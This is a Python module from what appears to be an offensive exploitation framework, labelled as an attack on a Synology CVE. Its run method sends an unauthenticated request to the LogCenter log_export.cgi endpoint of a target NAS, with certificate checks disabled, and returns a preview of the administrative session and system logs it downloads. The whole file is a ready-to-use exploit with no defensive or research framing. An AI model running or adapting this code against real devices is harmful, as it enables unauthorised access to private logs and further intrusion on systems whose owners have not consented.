import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "synology/cve_2024_10443_attack"
        self.description = "Exploit engine to download active session logs and system center entries from Synology."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "5000"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        url = f"http://{target}:{port}/webman/modules/LogCenter/log_export.cgi"
        
        try:
            async with httpx.AsyncClient(timeout=12.0, verify=False) as client:
                print("\033[1;33m[*] Tentative de téléchargement de l'export de logs administratifs Synology...\033[0m")
                response = await client.get(url)
                
                if response.status_code == 200:
                    # Tronquer l'affichage si le fichier est massif pour éviter de crash la console
                    preview = response.text[:1000] + "\n[... Données tronquées pour lisibilité ...]" if len(response.text) > 1000 else response.text
                    return {
                        "success": True,
                        "details": f"Synology log database downloaded successfully. Preview:\n{preview}"
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Exploit failed. The endpoint might require strict authentication tokens on this version."}
